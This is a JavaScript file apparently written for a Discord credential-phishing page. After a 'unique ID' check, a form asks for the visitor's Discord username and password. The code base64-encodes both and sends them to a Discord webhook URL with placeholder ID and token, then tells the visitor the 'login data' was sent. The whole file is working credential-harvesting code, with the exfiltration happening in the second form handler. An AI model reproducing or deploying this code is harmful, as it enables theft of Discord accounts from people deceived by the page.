document.getElementById('uniqueIdForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const uniqueId = document.getElementById('uniqueId').value;

    fetch('validate_id.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ uniqueId })
    })
    .then(response => response.json())
    .then(data => {
        if (data.valid) {
            const confirmMessage = `Did you get this ID from ${data.server}?`;
            if (confirm(confirmMessage)) {
                document.getElementById('uniqueIdForm').style.display = 'none';
                document.getElementById('loginForm').style.display = 'block';
            }
        } else {
            alert('Invalid Unique ID');
        }
    });
});

document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const username = document.getElementById('discordUsername').value;
    const password = document.getElementById('discordPassword').value;

    const data = {
        username: btoa(username),
        password: btoa(password)
    };

    fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (response.ok) {
            alert('Login data sent successfully');
        } else {
            alert('Failed to send login data');
        }
    });
});
